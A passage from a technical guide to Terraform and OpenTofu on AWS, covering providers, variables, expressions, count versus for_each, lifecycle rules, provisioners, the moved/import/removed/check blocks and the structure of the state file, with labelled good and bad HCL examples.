```hcl
provider "aws" {
  region = "ap-south-1"

  default_tags {
    tags = {
      Project     = var.project
      Environment = var.environment
      ManagedBy   = "terraform"
    }
  }

  # Guardrail: fail loudly if credentials point at the wrong account.
  allowed_account_ids = [var.aws_account_id]

  # Optional: assume a role for cross-account work
  assume_role {
    role_arn     = "arn:aws:iam::${var.aws_account_id}:role/terraform-apply"
    session_name = "terraform-${var.environment}"
  }
}
```

🧠 **`allowed_account_ids` is the cheapest safety control in this entire guide.** One line, and it makes "I applied the staging config against the production account" impossible. Put it in every root module.

### 9.2 Provider aliases: multi-region and multi-account

```hcl
provider "aws" {
  region = "ap-south-1"          # default, unaliased
}

provider "aws" {
  alias  = "us_east_1"
  region = "us-east-1"           # ACM certs for CloudFront must live here
}

provider "aws" {
  alias  = "shared_services"
  region = "ap-south-1"
  assume_role {
    role_arn = "arn:aws:iam::999999999999:role/terraform-readonly"
  }
}

resource "aws_acm_certificate" "cdn" {
  provider          = aws.us_east_1        # explicitly select the alias
  domain_name       = "cdn.example.com"
  validation_method = "DNS"
}
```

Passing aliases into modules:

```hcl
module "global_edge" {
  source = "../../modules/edge"

  providers = {
    aws           = aws            # the module's default aws
    aws.us_east_1 = aws.us_east_1  # the module's aws.us_east_1
  }
}
```

The module must declare which aliases it expects:

```hcl
# modules/edge/terraform.tf
terraform {
  required_providers {
    aws = {
      source                = "hashicorp/aws"
      version               = "~> 6.66"
      configuration_aliases = [aws.us_east_1]
    }
  }
}
```

⚠️ **Never put a `provider` block inside a reusable child module.** It works, but it permanently prevents that module from being removed cleanly — Terraform cannot destroy resources whose provider configuration has disappeared. Providers belong in root modules only; modules declare `configuration_aliases` and receive them.

🔬 **OpenTofu only:** `for_each` on provider blocks (1.9+) lets you generate one provider per region or account dynamically. Terraform has no equivalent, and this is one of the sharper divergences between the two.

### 9.3 Provider version pinning in practice

```hcl
# Root module — tight
aws = { source = "hashicorp/aws", version = "~> 6.66" }

# Child module — loose, so consumers can choose
aws = { source = "hashicorp/aws", version = ">= 6.0" }
```

⚠️ If two modules in the same configuration declare incompatible constraints, `init` fails with "no available provider version matches". The fix is always to loosen the child modules, never to tighten the root.

### 9.4 The 2026 AWS provider v6 breaking changes

If you are reading older material, these caught many teams:

| Change | Impact |
|---|---|
| Per-resource `region` argument | Multi-region configs can now avoid aliases in many cases |
| `data.aws_region.name` removed in favour of `.region` | Silent breakage in older modules |
| Strict boolean parsing | `"true"` as a string now errors where it previously coerced |
| `aws_ami` with `most_recent = true` now **errors** unless `owners` is set | A genuine security fix — it prevented AMI-name-squatting attacks |
| OpsWorks resources removed | Service is retired |
| Redshift defaults to private and encrypted | New clusters behave differently |

⚠️ **Provider version 6.57.0 was withdrawn.** If a lock file pins it, re-lock.

### 9.5 Provider-defined functions

🔬 Terraform 1.8+ / OpenTofu 1.7+. Providers can ship functions:

```hcl
locals {
  parsed = provider::aws::arn_parse("arn:aws:ecs:ap-south-1:123456789012:service/prod/api")
  # → { partition = "aws", service = "ecs", region = "ap-south-1", account_id = "...", resource = "service/prod/api" }
}
```

Useful, but note the version floor — a module using these will not work for consumers on older Terraform.

---

## Chapter 10 — Resources and Data Sources

### 10.1 Resources

```hcl
resource "aws_ecs_cluster" "main" {
  name = "${var.project}-${var.environment}"

  setting {
    name  = "containerInsights"
    value = "enhanced"
  }
}
```

`aws_ecs_cluster` is the **type** (the provider prefix determines which plugin handles it). `main` is the **local name**. Together they form the **address** `aws_ecs_cluster.main`, which is the key under which this resource is recorded in state.

🧠 **The address is the identity, not the name argument.** Renaming the local name from `main` to `primary` makes Terraform believe the old resource is gone and a new one is needed — it will plan destroy-and-create. This is what `moved` blocks exist to prevent (Chapter 16).

**Attribute categories:**

| Category | Meaning |
|---|---|
| Required arguments | Must be set; omitting them is a validation error |
| Optional arguments | Have a provider default |
| Computed attributes | Set by the API, read-only, e.g. `id`, `arn` |
| Optional + computed | You may set them; if you do not, the API picks. Behaves confusingly on removal |
| `ForceNew` | Changing them replaces the resource. Not visible in HCL — read the provider docs |

### 10.2 Data sources

A data source **reads** something. It never creates, updates or deletes.

```hcl
data "aws_caller_identity" "current" {}

data "aws_availability_zones" "available" {
  state = "available"
  filter {
    name   = "opt-in-status"
    values = ["opt-in-not-required"]
  }
}

data "aws_ami" "al2023" {
  most_recent = true
  owners      = ["amazon"]          # ⚠️ REQUIRED in provider v6+, and correctly so
  filter {
    name   = "name"
    values = ["al2023-ami-*-x86_64"]
  }
}

data "aws_secretsmanager_secret_version" "db" {
  secret_id = "prod/api/db"
}
```

**When data sources are read:**

- If all their arguments are known at plan time → read **during plan**.
- If any argument depends on a resource that does not exist yet → deferred to **apply**, shown as `<=` in the plan.

⚠️ **Data sources that read secrets put those secrets in state.** `data.aws_secretsmanager_secret_version.db.secret_string` is stored, in plaintext, in your state file. Chapter 41 covers what to do instead (ephemeral resources).

### 10.3 Resource vs data source: the decision

| Question | Resource | Data source |
|---|---|---|
| Who owns this object's lifecycle? | Terraform, in this stack | Someone else |
| Will Terraform create it? | Yes | No |
| Will `terraform destroy` remove it? | Yes | No |
| Appears in state? | Yes, fully | Yes, as a cached read |
| Can be imported? | Yes | N/A |

⚠️ **The double-management trap.** If stack A creates a VPC as a resource and stack B *also* declares it as a resource, both will fight over it forever. Stack B must use a data source or read A's remote state (Chapter 28).

### 10.4 Meta-arguments available on every resource

| Meta-argument | Purpose | Chapter |
|---|---|---|
| `count` | Create N copies | 13 |
| `for_each` | Create one per map/set element | 13 |
| `provider` | Select a provider alias | 9 |
| `depends_on` | Explicit ordering | 14 |
| `lifecycle` | Replacement and destruction behaviour | 14 |

---

## Chapter 11 — Variables, Outputs and Locals

### 11.1 Variables

```hcl
variable "instance_class" {
  description = "RDS instance class. Production must be at least db.r6g.large."
  type        = string
  default     = "db.t4g.micro"

  validation {
    condition     = can(regex("^db\\.", var.instance_class))
    error_message = "instance_class must start with 'db.'."
  }
}

variable "allowed_cidrs" {
  description = "CIDR blocks permitted to reach the service"
  type        = list(string)
  default     = []

  validation {
    condition = alltrue([
      for c in var.allowed_cidrs : can(cidrnetmask(c))
    ])
    error_message = "All entries must be valid CIDR blocks."
  }

  validation {
    condition     = !contains(var.allowed_cidrs, "0.0.0.0/0")
    error_message = "0.0.0.0/0 is not permitted. Use the public ALB instead."
  }
}

variable "db_password" {
  description = "Master password. Prefer manage_master_user_password instead."
  type        = string
  sensitive   = true
  default     = null
}

variable "service" {
  description = "Service configuration"
  type = object({
    name          = string
    cpu           = number
    memory        = number
    desired_count = number
    port          = optional(number, 8080)      # 🔬 optional() with default: 1.3+
    health_path   = optional(string, "/actuator/health")
    env_vars      = optional(map(string), {})
  })
}
```

**Multiple `validation` blocks are allowed** and all are evaluated — you get every failure at once, not just the first.

🔬 **Cross-variable validation** (Terraform 1.9+): a validation condition may reference *other* variables:

```hcl
variable "environment" { type = string }

variable "instance_class" {
  type = string
  validation {
    condition = var.environment != "production" || can(regex("^db\\.(r6g|m6g|r7g)\\.", var.instance_class))
    error_message = "Production requires a memory- or general-purpose instance class, not burstable."
  }
}
```

This is excellent for encoding policy in the module itself rather than in a separate policy engine.

**Precedence, lowest to highest:**

```mermaid
flowchart LR
    A["default in variable block"] --> B["terraform.tfvars"]
    B --> C["*.auto.tfvars<br/>alphabetical order"]
    C --> D["TF_VAR_name<br/>environment variable"]
    D --> E["-var-file=...<br/>command line"]
    E --> F["-var name=...<br/>command line"]
```

⚠️ `TF_VAR_` environment variables are how CI passes values, and they are **invisible in the configuration**. If a plan produces an unexplained value, check the environment.

### 11.2 The `sensitive` flag and what it does not do

```hcl
variable "api_key" {
  type      = string
  sensitive = true
}

output "connection_string" {
  value     = "postgres://${var.user}:${var.password}@${aws_db_instance.main.endpoint}/db"
  sensitive = true
}
```

⚠️ **`sensitive = true` only redacts CLI and UI output. The value is stored in state in plaintext.** It is a shoulder-surfing control, not an encryption control. Chapter 41 covers real mitigations.

Sensitivity is also *contagious*: any expression derived from a sensitive value becomes sensitive, which can cause confusing errors like "Output refers to sensitive values" on an output you did not mark. Use `nonsensitive()` deliberately and sparingly.

### 11.3 Outputs

```hcl
output "vpc_id" {
  description = "ID of the VPC"
  value       = aws_vpc.main.id
}

output "private_subnet_ids" {
  description = "IDs of the private subnets, ordered by AZ"
  value       = [for s in aws_subnet.private : s.id]
}

output "db_endpoint" {
  description = "RDS connection endpoint"
  value       = aws_db_instance.main.endpoint

  # Do not publish this output until the DNS record exists
  depends_on = [aws_route53_record.db]
}

output "service_url" {
  value = "https://${aws_route53_record.api.fqdn}"

  precondition {
    condition     = aws_lb.main.dns_name != ""
    error_message = "Load balancer has no DNS name; something is wrong."
  }
}
```

Outputs serve three purposes: returning values from a child module to its caller, exposing values to other stacks via remote state, and showing humans useful information after an apply.

🔬 **Ephemeral outputs** (1.10+) let a module return a secret to its caller without that value entering state — but only for consumption by other ephemeral contexts.

### 11.4 Locals

```hcl
locals {
  name_prefix = "${var.project}-${var.environment}"

  common_tags = {
    Project     = var.project
    Environment = var.environment
    ManagedBy   = "terraform"
    Repository  = var.repository
    Stack       = "api"
  }

  # Derived configuration keeps conditionals out of resource blocks
  is_production = var.environment == "production"

  db_config = {
    instance_class          = local.is_production ? "db.r6g.xlarge" : "db.t4g.medium"
    multi_az                = local.is_production
    backup_retention_period = local.is_production ? 30 : 7
    deletion_protection     = local.is_production
    skip_final_snapshot     = !local.is_production
  }

  # Normalise a list into a map so for_each gets stable keys
  services_by_name = { for s in var.services : s.name => s }
}
```

🧠 **Locals are for naming a computation, not for indirection.** A local used once, that just renames a variable, makes the code harder to read. A local that encodes a real decision (`is_production`, `db_config`) makes it easier. That is the test.

### 11.5 Variable vs local vs output

| | `variable` | `local` | `output` |
|---|---|---|---|
| Direction | Input | Internal | Output |
| Set by | Caller, tfvars, env, CLI | Computed from other values | Computed from resources |
| Can be overridden | Yes | **No** | No |
| Visible outside the module | As an argument | No | Yes |
| Can be sensitive | Yes | Inherits sensitivity | Yes |
| Evaluated | Before anything | Lazily, in dependency order | After apply |

---

## Chapter 12 — Expressions and Functions

### 12.1 Conditionals

```hcl
count               = var.enable_nat ? 1 : 0
instance_class      = var.environment == "production" ? "db.r6g.large" : "db.t4g.micro"
backup_retention    = local.is_production ? 30 : 7
```

⚠️ **Both branches of a ternary are evaluated for type checking**, so both must be the same type. `var.x ? [1,2] : "none"` is an error.

### 12.2 `for` expressions

```hcl
# list → list
upper_names = [for n in var.names : upper(n)]

# list → list, filtered
prod_only = [for s in var.services : s.name if s.environment == "production"]

# list → map
by_name = { for s in var.services : s.name => s }

# map → map, transforming values
tags_upper = { for k, v in var.tags : k => upper(v) }

# with index
indexed = { for i, s in var.subnets : i => s }

# grouping — note the ellipsis
by_env = { for s in var.services : s.environment => s.name... }
# → { production = ["api", "worker"], staging = ["api"] }
```

### 12.3 Splat expressions

```hcl
subnet_ids  = aws_subnet.private[*].id           # works on count and for_each
all_arns    = values(aws_instance.web)[*].arn    # for_each needs values() first
```

### 12.4 Dynamic blocks

```hcl
resource "aws_security_group" "service" {
  name   = "${local.name_prefix}-service"
  vpc_id = var.vpc_id

  dynamic "ingress" {
    for_each = var.ingress_rules
    content {
      description     = ingress.value.description
      from_port       = ingress.value.port
      to_port         = ingress.value.port
      protocol        = "tcp"
      security_groups = ingress.value.source_sg_ids
    }
  }
}
```

⚠️ Dynamic blocks are hard to read and hard to debug. Use them when the number of blocks is genuinely variable. If it is always two or three, write them out literally.

⚠️ **For security groups specifically, prefer standalone rule resources** over inline `ingress`/`egress` blocks or dynamic blocks:

```hcl
resource "aws_vpc_security_group_ingress_rule" "from_alb" {
  security_group_id            = aws_security_group.service.id
  referenced_security_group_id = var.alb_security_group_id
  from_port                    = var.container_port
  to_port                      = var.container_port
  ip_protocol                  = "tcp"
  description                  = "ALB to service"
}
```

Reasons: no cycle errors between mutually-referencing groups, each rule diffs independently, and you avoid the notorious behaviour where inline rules silently delete any rule added outside Terraform.

### 12.5 Functions you will actually use

| Category | Functions |
|---|---|
| String | `format`, `join`, `split`, `replace`, `trimspace`, `lower`, `upper`, `substr`, `startswith`, `endswith`, `strcontains` |
| Collection | `length`, `keys`, `values`, `merge`, `lookup`, `contains`, `concat`, `flatten`, `distinct`, `toset`, `tolist`, `tomap`, `zipmap`, `coalesce`, `try`, `one`, `chunklist`, `setsubtract` |
| Encoding | `jsonencode`, `jsondecode`, `yamlencode`, `yamldecode`, `base64encode`, `base64decode` |
| Filesystem | `file`, `templatefile`, `fileexists`, `fileset`, `abspath`, `dirname`, `basename` |
| Network | `cidrsubnet`, `cidrhost`, `cidrnetmask`, `cidrsubnets` |
| Hash/crypto | `md5`, `sha256`, `filesha256`, `uuid`, `bcrypt` |
| Type/conversion | `can`, `try`, `sensitive`, `nonsensitive`, `issensitive`, `type` |
| Date | `timestamp`, `timeadd`, `formatdate`, `plantimestamp` |

**The ones worth internalising:**

```hcl
# cidrsubnet — carve subnets from a VPC CIDR without hardcoding
# cidrsubnet(prefix, newbits, netnum)
cidrsubnet("10.0.0.0/16", 8, 0)   # → 10.0.0.0/24
cidrsubnet("10.0.0.0/16", 8, 1)   # → 10.0.1.0/24
cidrsubnet("10.0.0.0/16", 4, 1)   # → 10.16.0.0/20

# try — fall back without failing
name = try(var.config.name, var.default_name, "fallback")

# can — returns bool, ideal inside validation
can(regex("^i-", var.instance_id))

# merge — layered tags, later wins
tags = merge(local.common_tags, var.extra_tags, { Name = local.name_prefix })

# one — collapse a 0-or-1 list from count
nat_id = one(aws_nat_gateway.main[*].id)   # null if count = 0

# templatefile — render a file with variables
container_definitions = templatefile("${path.module}/task.json.tftpl", {
  image = var.image
  port  = var.port
})

# flatten — the standard trick for nested for_each
locals {
  subnet_routes = flatten([
    for az, subnets in var.subnets_by_az : [
      for s in subnets : { az = az, cidr = s }
    ]
  ])
}
```

⚠️ **Never use `uuid()` or `timestamp()` in a resource argument.** They produce a new value on every plan, so Terraform sees a permanent diff and will replace the resource forever. If you need a stable random value, use `random_id` or `random_password` with `keepers`.

---

## Chapter 13 — `count` vs `for_each`, and Dynamic Blocks

### 13.1 The single most important rule in this chapter

🧠 **Use `for_each` for sets of named things. Use `count` only for "zero or one".**

The reason is how state addresses are formed:

| Meta-argument | State address | Effect of removing the middle element |
|---|---|---|
| `count` | `aws_instance.web[0]`, `[1]`, `[2]` | **Everything after it shifts.** `[1]` becomes `[2]`'s config → Terraform destroys and recreates both |
| `for_each` | `aws_instance.web["api"]`, `["worker"]` | Only the removed key is destroyed. Others untouched |

### 13.2 Demonstration of the `count` trap

```hcl
# ⚠️ INTENTIONALLY BAD EXAMPLE
variable "users" {
  default = ["alice", "bob", "carol"]
}

resource "aws_iam_user" "team" {
  count = length(var.users)
  name  = var.users[count.index]
}
```

State after apply:

```
aws_iam_user.team[0] → alice
aws_iam_user.team[1] → bob
aws_iam_user.team[2] → carol
```

Now `bob` leaves and you remove him from the list:

```
# Terraform's plan:
~ aws_iam_user.team[1]  name = "bob"   -> "carol"   # forces replacement
- aws_iam_user.team[2]  name = "carol"              # destroy
```

Carol's IAM user gets **destroyed and recreated** — new access keys, broken automation — for a change that had nothing to do with her.

```hcl
# ✅ FIXED
resource "aws_iam_user" "team" {
  for_each = toset(var.users)
  name     = each.key
}
```

State:

```
aws_iam_user.team["alice"]
aws_iam_user.team["bob"]
aws_iam_user.team["carol"]
```

Removing bob plans exactly one destroy, of `["bob"]`. Nothing else moves.

### 13.3 Full comparison

| | `count` | `for_each` |
|---|---|---|
| Accepts | number | `set(string)` or `map(any)` |
| Iterator | `count.index` (0-based number) | `each.key`, `each.value` |
| Address | `res.name[0]` | `res.name["key"]` |
| Stable across list changes | ❌ No | ✅ Yes |
| Good for | Conditional creation (`0` or `1`) | Named collections |
| Splat support | `res.name[*].id` | needs `values(res.name)[*].id` |
| Keys must be known at plan time | N/A | ✅ **Yes** — this is the main limitation |

### 13.4 The "keys must be known at plan time" error

```hcl
# ⚠️ FAILS — bucket IDs are unknown until the buckets exist
resource "aws_s3_bucket_versioning" "all" {
  for_each = toset([for b in aws_s3_bucket.data : b.id])
  bucket   = each.key
}
```

> `Error: Invalid for_each argument ... depends on resource attributes that cannot be determined until apply`

Fix: iterate over something known at plan time — the input variable, not the created resource.

```hcl
# ✅ FIXED
resource "aws_s3_bucket" "data" {
  for_each = toset(var.bucket_names)
  bucket   = "${local.name_prefix}-${each.key}"
}

resource "aws_s3_bucket_versioning" "all" {
  for_each = aws_s3_bucket.data              # iterate the resource map directly
  bucket   = each.value.id
  versioning_configuration { status = "Enabled" }
}
```

Iterating a `for_each` resource map directly works because the *keys* come from the original known set.

### 13.5 Conditional creation — the legitimate use of `count`

```hcl
resource "aws_nat_gateway" "main" {
  count         = var.enable_nat_gateway ? 1 : 0
  allocation_id = aws_eip.nat[0].id
  subnet_id     = var.public_subnet_ids[0]
}

# Reference it safely
output "nat_gateway_id" {
  value = one(aws_nat_gateway.main[*].id)   # null when count = 0
}
```

🔬 **OpenTofu 1.11+** offers a cleaner alternative:

```hcl
resource "aws_nat_gateway" "main" {
  lifecycle {
    enabled = var.enable_nat_gateway    # OpenTofu only
  }
}
```

### 13.6 `for_each` over a complex object map

```hcl
variable "services" {
  type = map(object({
    cpu           = number
    memory        = number
    desired_count = number
    port          = optional(number, 8080)
  }))
  default = {
    api    = { cpu = 1024, memory = 2048, desired_count = 3 }
    worker = { cpu = 512,  memory = 1024, desired_count = 2, port = 9090 }
  }
}

module "service" {
  source   = "../../modules/ecs-service"
  for_each = var.services

  name          = each.key
  cpu           = each.value.cpu
  memory        = each.value.memory
  desired_count = each.value.desired_count
  container_port = each.value.port
}
```

`for_each` works on `module` blocks exactly as it does on resources. This is the standard multi-service pattern.

---

## Chapter 14 — `lifecycle` and `depends_on`

### 14.1 `create_before_destroy`

Default order for a replacement is **destroy, then create** — which means downtime.

```hcl
resource "aws_lb_target_group" "api" {
  name_prefix = "api-"       # ⚠️ name_prefix, not name — see below
  port        = 8080
  protocol    = "HTTP"
  vpc_id      = var.vpc_id

  lifecycle {
    create_before_destroy = true
  }
}
```

⚠️ **`create_before_destroy` fails on name collisions.** If the resource has a unique name and you create the new one before destroying the old, both exist briefly with the same name → API error. That is why `name_prefix` exists on AWS resources that support it. Where it does not, you need a `random_id` suffix or accept the downtime.

⚠️ **It is contagious.** If resource A has `create_before_destroy` and B depends on A, B is forced into create-before-destroy too, whether or not you declared it. This can cascade surprisingly far.

```mermaid
flowchart LR
    subgraph D["Default: destroy_before_create"]
        D1["Destroy old TG"] --> D2["Create new TG"]
        D2 --> D3["⚠️ Gap: listener has no target"]
    end
    subgraph C["create_before_destroy = true"]
        C1["Create new TG"] --> C2["Update listener to point at it"]
        C2 --> C3["Destroy old TG"]
        C3 --> C4["✅ No gap"]
    end
```

### 14.2 `prevent_destroy`

```hcl
resource "aws_db_instance" "main" {
  # ...
  lifecycle {
    prevent_destroy = true
  }
}
```

Any plan that would destroy this resource **fails at plan time** with an error. It cannot be overridden by `-auto-approve` or `-force`; you must edit the code and merge that change.

⚠️ Limitations:
- The value must be a **literal** in Terraform. `prevent_destroy = var.is_production` is an error. (🔬 OpenTofu 1.12+ allows variables.)
- It does not prevent **replacement** caused by a `ForceNew` attribute in some provider versions — always read the plan.
- It does not stop someone running `terraform state rm` then deleting manually.

🔬 **Terraform 1.16 / OpenTofu 1.12** add `lifecycle { destroy = false }`, a stronger form that also blocks replacement paths. Prefer it where available.

**Recommendation:** apply to RDS/Aurora, ElastiCache with persistence, S3 buckets holding data, KMS keys, Route53 hosted zones, the state bucket, and ECR repositories.

### 14.3 `ignore_changes`

```hcl
resource "aws_ecs_service" "api" {
  # ...
  lifecycle {
    ignore_changes = [
      task_definition,     # updated by the deployment pipeline, not Terraform
      desired_count,       # managed by autoscaling
    ]
  }
}

resource "aws_db_instance" "main" {
  lifecycle {
    ignore_changes = [
      password,                  # rotated outside Terraform
      final_snapshot_identifier,
    ]
  }
}

# Ignore everything — rare, and usually a smell
resource "aws_something" "x" {
  lifecycle { ignore_changes = all }
}
```

🧠 `ignore_changes` is how you say "another system legitimately owns this attribute". It is the correct tool for the Terraform-vs-CD-pipeline boundary.

⚠️ It is also how you hide genuine drift from yourself. Every entry should have a comment saying *what else* manages that attribute. An `ignore_changes` with no explanation is a bug waiting to surface.

### 14.4 `replace_triggered_by`

🔬 Terraform 1.2+.

```hcl
resource "aws_ecs_service" "api" {
  # ...
  lifecycle {
    replace_triggered_by = [aws_ecs_task_definition.api.revision]
  }
}
```

Forces replacement of this resource when another resource changes. Useful when an implicit dependency does not exist but a rebuild is genuinely required.

### 14.5 `precondition` and `postcondition`

🔬 Terraform 1.2+.

```hcl
resource "aws_db_instance" "main" {
  instance_class = var.instance_class

  lifecycle {
    precondition {
      condition     = var.environment != "production" || var.multi_az
      error_message = "Production databases must have multi_az enabled."
    }

    postcondition {
      condition     = self.storage_encrypted
      error_message = "Database was created without encryption at rest."
    }
  }
}
```

Preconditions run before the resource is created or updated; postconditions after. `self` refers to the resource itself and is only valid in `postcondition`.

**Recommendation:** use preconditions for invariants the module author knows must hold. They produce far better error messages than a failed API call three minutes into an apply.

### 14.6 `depends_on`

```hcl
resource "aws_ecs_service" "api" {
  # ...
  depends_on = [
    aws_iam_role_policy_attachment.task_execution,
    aws_lb_listener.https,
  ]
}
```

Only needed when a dependency exists in reality but not in the configuration — typically IAM permission propagation, or ordering constraints enforced by the API rather than by data flow.

⚠️ **`depends_on` on a `module` block makes the entire module depend on that thing**, which can serialise work that could have run in parallel and dramatically slow applies. Use it at resource level where possible.

⚠️ Over-using `depends_on` is a common beginner pattern that makes graphs sequential and plans slow. If A references B's attribute, the dependency already exists — do not restate it.

---

## Chapter 15 — Provisioners, and Why to Avoid Them

### 15.1 What they are

```hcl
# ⚠️ INTENTIONALLY BAD EXAMPLE — do not do this
resource "aws_instance" "web" {
  ami           = data.aws_ami.al2023.id
  instance_type = "t3.micro"

  provisioner "remote-exec" {
    inline = [
      "sudo dnf install -y nginx",
      "sudo systemctl enable --now nginx",
    ]
    connection {
      type        = "ssh"
      host        = self.public_ip
      user        = "ec2-user"
      private_key = file("~/.ssh/id_rsa")
    }
  }

  provisioner "local-exec" {
    command = "echo ${self.public_ip} >> inventory.txt"
  }
}
```

### 15.2 Why HashiCorp's own documentation calls them a last resort

| Problem | Consequence |
|---|---|
| **Not in the plan** | A provisioner's effects are invisible until apply. You cannot review what will happen |
| **Not in state** | Terraform records that the provisioner ran, not what it did. It cannot detect drift in anything the script changed |
| **Not idempotent** | Re-running requires the script to be idempotent, which most are not |
| **Failure is destructive** | A failed provisioner marks the resource **tainted**; the next apply destroys and recreates it |
| **Requires connectivity** | `remote-exec` means your Terraform runner needs SSH to the instance — often through a bastion, in a VPC, with a key. In CI this is painful and a security problem |
| **`local-exec` breaks reproducibility** | The command depends on what is installed on the machine running Terraform |

### 15.3 What to use instead

| You want to | Use instead of a provisioner |
|---|---|
| Install software on a VM | A pre-baked AMI (Packer), or `user_data` / cloud-init |
| Run something after a resource exists | A Lambda, an ECS task, a Kubernetes Job, or your CD pipeline |
| Bootstrap a database schema | A migration tool (Flyway, Liquibase) in a separate pipeline stage |
| Write a file locally | `local_file` resource, or an output your pipeline consumes |
| Call an API | A provider for that API, or `http` data source, or a small custom provider |
| Register something with a service | That service's Terraform provider |
| Copy files to a server | Containers. Genuinely — stop managing servers |

```hcl
# ✅ Acceptable use of user_data — declarative, visible in the plan, no SSH needed
resource "aws_instance" "web" {
  ami           = data.aws_ami.al2023.id
  instance_type = "t3.micro"

  user_data                   = templatefile("${path.module}/cloud-init.yaml", {
    app_version = var.app_version
  })
  user_data_replace_on_change = true
}
```

### 15.4 The one provisioner that is genuinely useful

```hcl
resource "aws_instance" "web" {
  # ...
  provisioner "local-exec" {
    when       = destroy
    command    = "echo 'Instance ${self.id} destroyed at $(date)' >> audit.log"
    on_failure = continue
  }
}
```

Destroy-time provisioners for logging or deregistration are occasionally the only option. 🔬 Terraform 1.9+ allows them in `removed` blocks too, which is the cleaner place for them.

**Recommendation:** treat any provisioner in a PR as requiring a written justification in the description. Most will not survive that test.

---

## Chapter 16 — `moved`, `import`, `removed`, `check` and Custom Conditions

These four blocks turn state surgery — historically done with scary imperative CLI commands — into reviewable code. This is one of the most important developments in Terraform's history for production safety.

```mermaid
flowchart LR
    subgraph OLD["The old imperative way"]
        O1["terraform state mv"] --> O2["⚠️ local only<br/>⚠️ immediate<br/>⚠️ no review<br/>⚠️ no plan preview"]
        O3["terraform import"] --> O2
        O4["terraform state rm"] --> O2
    end
    subgraph NEW["The config-driven way"]
        N1["moved block · 1.1+"] --> N2["✅ in code<br/>✅ reviewed in a PR<br/>✅ previewed in the plan<br/>✅ runs in CI"]
        N3["import block · 1.5+"] --> N2
        N4["removed block · 1.7+"] --> N2
    end
```

### 16.1 `moved` — rename and restructure without destroying

🔬 Terraform 1.1+ / OpenTofu 1.6+.

```hcl
# Renaming a resource
moved {
  from = aws_instance.web
  to   = aws_instance.api
}

# Moving a resource into a module
moved {
  from = aws_db_instance.main
  to   = module.database.aws_db_instance.main
}

# Converting count → for_each
moved {
  from = aws_iam_user.team[0]
  to   = aws_iam_user.team["alice"]
}

# Renaming a module
moved {
  from = module.networking
  to   = module.vpc
}
```

The plan then shows:

```
Terraform will perform the following actions:
  # aws_instance.web has moved to aws_instance.api
    resource "aws_instance" "api" {
        id = "i-0abc123"
        # (no changes)
    }

Plan: 0 to add, 0 to change, 0 to destroy.
```

🧠 **Zero changes.** That is the whole point. Without the `moved` block you would see `1 to add, 1 to destroy`.

**Rules:** source and destination must be in the **same state file**. Once every workspace has applied the move, the block can be deleted — though leaving it costs nothing and protects anyone on an old branch.

### 16.2 `import` — bring existing infrastructure under management

🔬 Terraform 1.5+ / OpenTofu 1.6+. `for_each` on import blocks: 1.7+. Import blocks inside modules: 🔬 Terraform 1.16+.

```hcl
import {
  to = aws_s3_bucket.legacy
  id = "acme-legacy-uploads"
}

resource "aws_s3_bucket" "legacy" {
  bucket = "acme-legacy-uploads"
}
```

```
Plan: 1 to import, 0 to add, 0 to change, 0 to destroy.
```

**Bulk import with `for_each`:**

```hcl
locals {
  legacy_buckets = {
    uploads = "acme-legacy-uploads"
    backups = "acme-legacy-backups"
    logs    = "acme-legacy-logs"
  }
}

import {
  for_each = local.legacy_buckets
  to       = aws_s3_bucket.legacy[each.key]
  id       = each.value
}

resource "aws_s3_bucket" "legacy" {
  for_each = local.legacy_buckets
  bucket   = each.value
}
```

**Config generation:**

```bash
terraform plan -generate-config-out=generated.tf
```

⚠️ **Still experimental as of 2026.** It produces syntactically valid but ugly HCL: every optional attribute written out, no variables, no modules, sometimes invalid combinations. Treat the output as a starting draft to be heavily edited, never as final code. Chapter 60 covers the full workflow.

### 16.3 `removed` — stop managing without destroying

🔬 Terraform 1.7+.

```hcl
# The resource block is DELETED from the config, and this block added:
removed {
  from = aws_s3_bucket.legacy

  lifecycle {
    destroy = false     # remove from state only; leave the real bucket alone
  }
}
```

This replaces `terraform state rm`, with the advantages of being reviewable and running in CI. Setting `destroy = true` instead means "actually destroy it", which is the same as just deleting the resource block.

🔬 Terraform 1.9+ allows `provisioner` blocks inside `removed` for destroy-time cleanup.

### 16.4 `check` blocks

🔬 Terraform 1.5+.

```hcl
check "api_is_healthy" {
  data "http" "health" {
    url = "https://${var.api_domain}/actuator/health"
  }

  assert {
    condition     = data.http.health.status_code == 200
    error_message = "API health endpoint returned ${data.http.health.status_code}."
  }
}

check "certificate_not_expiring" {
  data "aws_acm_certificate" "main" {
    domain   = var.domain
    statuses = ["ISSUED"]
  }

  assert {
    condition     = timecmp(plantimestamp(), timeadd(data.aws_acm_certificate.main.not_after, "-720h")) < 0
    error_message = "Certificate expires within 30 days."
  }
}
```

🧠 **The crucial difference from preconditions: a failed `check` produces a *warning*, not an error.** It does not block the apply. This makes checks the right tool for continuous validation — run them on a schedule as a lightweight health monitor of your infrastructure's assumptions.

### 16.5 Which to use when

| Situation | Block |
|---|---|
| Renaming a resource | `moved` |
| Moving a resource into or out of a module | `moved` |
| Converting `count` to `for_each` | `moved` |
| Adopting existing infrastructure | `import` |
| Handing a resource to another team's stack | `removed` with `destroy = false` |
| Invariant that must hold before creating | `lifecycle { precondition }` |
| Invariant that must hold after creating | `lifecycle { postcondition }` |
| Ongoing health assertion that should warn, not block | `check` |
| Validating an input value | `variable { validation }` |

---
# Part IV — State

---

## Chapter 17 — What State Actually Is

### 17.1 The file

State is a JSON document. Here is a real fragment, trimmed:

```json
{
  "version": 4,
  "terraform_version": "1.16.4",
  "serial": 47,
  "lineage": "a1b2c3d4-5e6f-7890-abcd-ef1234567890",
  "outputs": {
    "db_endpoint": {
      "value": "prod-api.abc123.ap-south-1.rds.amazonaws.com:5432",
      "type": "string"
    }
  },
  "resources": [
    {
      "mode": "managed",
      "type": "aws_db_instance",
      "name": "main",
      "provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
      "instances": [
        {
          "schema_version": 2,
          "attributes": {
            "id": "prod-api-db",
            "arn": "arn:aws:rds:ap-south-1:123456789012:db:prod-api-db",
            "engine": "postgres",
            "engine_version": "16.3",
            "instance_class": "db.r6g.large",
            "username": "appuser",
            "password": "Sup3rS3cret!Password",
            "endpoint": "prod-api.abc123.ap-south-1.rds.amazonaws.com:5432",
            "storage_encrypted": true
          },
          "sensitive_attributes": [["password"]],
          "private": "eyJzY2hlbWFfdmVyc2lvbiI6IjIifQ==",
          "dependencies": [
            "aws_db_subnet_group.main",
            "aws_security_group.database"
          ]
        }
      ]
    }
  ],
  "check_results": null
}
```

### 17.2 The fields that matter

| Field | Meaning | Why you care |
|---|---|---|
| `version` | State **format** version (currently 4) | Not the Terraform version |
